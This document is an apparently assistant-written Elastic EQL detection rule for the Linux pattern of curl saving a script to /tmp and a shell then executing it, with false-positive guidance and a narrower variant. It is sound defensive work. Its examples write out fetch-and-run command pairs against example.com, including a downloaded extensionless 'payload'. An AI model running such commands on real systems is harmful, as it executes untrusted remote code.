Below is a **sequence-based detection rule** for detecting the classic **Linux download-and-execute** pattern where `curl` saves or creates a script under `/tmp`, and `bash`/another shell later executes something from `/tmp`.

This version is written as **Elastic EQL** because the requirement explicitly says “followed by,” which maps naturally to a temporal sequence rule. If you use another SIEM/EDR, the same logic can be implemented as a two-step correlation rule.

---

## Elastic EQL Detection Rule

```eql
sequence by host.name with maxspan=5m
  [process where event.type in ("start", "process_start")
    and (
      process.name : "curl"
      or process.executable : "*/bin/curl"
      or process.executable : "*/usr/bin/curl"
      or process.command_line : "*/bin/curl*"
      or process.command_line : "*curl*"
    )
    and (
      process.command_line : "*/tmp/*"
      or process.args : "*/tmp/*"
      or process.args : "/tmp/*"
    )
    and (
      process.command_line : "* -o /tmp/*"
      or process.command_line : "* -O /tmp/*"
      or process.command_line : "* --output /tmp/*"
      or process.command_line : "*--output=/tmp/*"
      or process.command_line : "*--output-dir /tmp/*"
      or process.command_line : "* > /tmp/*"
      or process.command_line : "*-o/tmp/*"
      or process.command_line : "*-O/tmp/*"
      or process.args : "-o"
      or process.args : "-O"
      or process.args : "--output"
      or process.args : "--output-dir"
      or process.args : "--output=/tmp/*"
      or process.args : "-o/tmp/*"
      or process.args : "-O/tmp/*"
    )
  ]
  [process where event.type in ("start", "process_start")
    and (
      process.name : "bash"
      or process.name : "sh"
      or process.name : "dash"
      or process.name : "zsh"
      or process.executable : "*/bin/bash"
      or process.executable : "*/bin/sh"
      or process.executable : "*/bin/dash"
      or process.executable : "*/bin/zsh"
      or process.command_line : "*/bin/bash*"
      or process.command_line : "*/bin/sh*"
      or process.command_line : "*/bin/dash*"
      or process.command_line : "*/bin/zsh*"
    )
    and (
      process.command_line : "* /tmp/*.sh*"
      or process.command_line : "* /tmp/*.bash*"
      or process.command_line : "*source /tmp/*"
      or process.command_line : "* . /tmp/*"
      or process.command_line : "* /tmp/*"
      or process.args : "*/tmp/*.sh*"
      or process.args : "*/tmp/*.bash*"
      or process.args : "*/tmp/*"
      or process.args : "/tmp/*"
    )
  ]
```

---

## What the rule detects

### Event 1 — `curl` downloads or writes to `/tmp`

The rule looks for a process related to `curl`, or a parent/shell command line containing `curl`, that writes to a `/tmp` target using common download/output mechanisms, such as:

```bash
curl http://example.com/script.sh -o /tmp/script.sh
curl http://example.com/script.sh --output /tmp/script.sh
curl http://example.com/script.sh > /tmp/script.sh
```

It also accounts for:

```bash
curl -o /tmp/script.sh http://example.com/script.sh
curl --output=/tmp/script.sh http://example.com/script.sh

```

After the `curl` event, the rule looks for execution of a `/tmp` path by:

```bash
bash /tmp/script.sh
sh /tmp/script.sh
bash /tmp/payload
source /tmp/script.sh
. /tmp/script.sh
```

```text
host.name
```

```text
5m
```

You can adjust `maxspan=5m` depending on your environment.

## False positives

This behavior is common in legitimate administration and tooling, for example:

```bash
curl -o /tmp/install.sh https://get.example.com/install.sh
bash /tmp/install.sh
```

Possible legitimate sources:

- software installers
- patching scripts
- Docker, Puppet, Chef, Ansible, Salt
- CI/CD runners
- developer debugging scripts
- cloud-init or bootstrap scripts

Recommended tuning:

1. Add host exceptions.
2. Allow known update servers or trusted download domains.
3. Allow signed scripts or known file hashes where possible.
4. Correlate with outbound network connections to suspicious domains/IPs.
5. If you need lower noise, require the executed file to be named `.sh` or `.bash`.

---

## Lower-false-positive variant

If `/tmp/*` execution is too noisy, restrict the second event to script extensions by using only these conditions:

```eql
process.command_line : "* /tmp/*.sh*"
or process.command_line : "* /tmp/*.bash*"
or process.args : "*/tmp/*.sh*"
or process.args : "*/tmp/*.bash*"
```

This reduces false positives but may miss malware that uses an extensionless filename such as:

```bash
curl http://example.com/payload -o /tmp/a37f
bash /tmp/a37f
```

A good production approach is to keep the broader `/tmp` execution rule and tune it with environment-specific exceptions.
